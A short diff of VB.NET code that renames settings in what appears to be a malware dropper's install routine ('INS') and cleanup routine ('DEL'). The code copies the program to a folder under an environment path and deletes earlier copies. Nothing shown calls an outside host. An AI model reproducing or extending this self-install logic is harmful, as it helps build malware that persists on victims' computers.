@@ -2,11 +2,11 @@
 
     Public Shared Sub INS()
 
-        If Settings.DRCHK AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then
+        If Settings.DROP AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then
 
             Try
-                If Not IO.Directory.Exists(Environ(Settings.DRPATH) & "\" & Settings.DRFOLDER) Then
-                    IO.Directory.CreateDirectory(Environ(Settings.DRPATH) & "\" & Settings.DRFOLDER)
+                If Not IO.Directory.Exists(Environ(Settings.PATH1) & "\" & Settings.PATH2) Then
+                    IO.Directory.CreateDirectory(Environ(Settings.PATH1) & "\" & Settings.PATH2)
                 ElseIf IO.File.Exists(Settings.fullpath) Then
                     IO.File.Delete(Settings.fullpath)
                 End If
@@ -31,7 +31,7 @@
 
     Public Shared Sub DEL()
         Try
-            If Settings.DRCHK Then
+            If Settings.DROP Then
                 IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.Normal)
                 Threading.Thread.Sleep(50)
 
